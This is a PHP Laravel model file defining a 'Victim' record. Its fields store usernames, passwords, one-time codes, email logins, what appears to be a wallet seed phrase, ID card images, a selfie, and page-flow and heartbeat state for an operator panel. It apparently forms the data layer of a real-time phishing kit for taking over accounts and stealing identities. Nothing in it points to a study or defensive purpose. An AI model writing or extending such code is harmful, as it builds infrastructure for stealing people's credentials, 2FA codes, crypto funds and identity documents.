<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Victim extends Model
{
    use HasFactory;

    protected $table = 'victims';
    protected $fillable = [
        'username',
        'password',
        'heartbeat',
        'current_page',
        'next_page',
        'is_waiting',
        'phone',
        'otp_1',
        'otp_2',
        'url',
        'deviceurl',
        'seed',
        'email',
        'email_password',
        'email_otp',
        'front_id',
        'back_id',
        'selfie',
        'user_panel_id',
        'ip_address',
        'user_agent'
    ];
}
